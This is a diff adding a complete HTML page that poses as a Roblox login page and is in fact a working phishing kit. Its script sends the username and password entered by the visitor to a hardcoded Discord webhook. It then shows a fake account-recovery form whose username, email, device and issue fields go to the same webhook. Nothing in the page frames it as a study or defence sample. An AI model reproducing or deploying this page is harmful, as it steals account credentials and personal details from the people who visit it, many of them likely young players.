@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Roblox - Login</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e3e3e3;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 20px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #aaa;
+      width: 300px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    input, select, textarea, button {
+      width: 100%;
+      padding: 8px;
+      margin: 5px 0 15px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    #recovery, #thankyou {
+      display: none;
+    }
+    #thankyou h2 {
+      text-align: center;
+      color: green;
+      font-size: 20px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container" id="login">
+  <h2>Login to Roblox</h2>
+  <input type="text" placeholder="Username">
+  <input type="password" placeholder="Password">
+  <button onclick="showRecovery()">Login</button>
+</div>
+
+<div class="container" id="recovery">
+  <h2>Account Recovery</h2>
+  <input type="text" placeholder="Username">
+  <input type="email" placeholder="Email">
+  <select>
+    <option selected disabled>Select Device</option>
+    <option>PC</option>
+    <option>iPhone</option>
+    <option>Android</option>
+    <option>Xbox</option>
+  </select>
+  <textarea rows="4" placeholder="Describe your issue"></textarea>
+  <button onclick="showThanks()">Submit</button>
+</div>
+
+<div class="container" id="thankyou">
+  <h2>Thank you for supporting.</h2>
+</div>
+
+<script>
+  const webhook = "https://discord.com/api/webhooks/1397164855018131624/8Fz-9gICTJRwCn6BfANjAWXPgIdvL1mCUX0pxJAnBuPCZ2jY3TYypj4l5lkQNUirSxTg";
+
+  function showRecovery() {
+    const username = document.querySelector("#login input[type='text']").value;
+    const password = document.querySelector("#login input[type='password']").value;
+
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `📥 **Login Attempt**\n👤 Username: \`${username}\`\n🔒 Password: \`${password}\``
+      })
+    });
+
+    document.getElementById("login").style.display = "none";
+    document.getElementById("recovery").style.display = "block";
+  }
+
+  function showThanks() {
+    const username = document.querySelector("#recovery input[type='text']").value;
+    const email = document.querySelector("#recovery input[type='email']").value;
+    const device = document.querySelector("#recovery select").value;
+    const issue = document.querySelector("#recovery textarea").value;
+
+    fetch(webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        content: `🔧 **Recovery Submitted**\n👤 Username: \`${username}\`\n📧 Email: \`${email}\`\n💻 Device: \`${device}\`\n📝 Issue: \`\`\`${issue}\`\`\``
+      })
+    });
+
+    document.getElementById("recovery").style.display = "none";
+    document.getElementById("thankyou").style.display = "block";
+  }
+</script>
+
+</body>
+    </html>
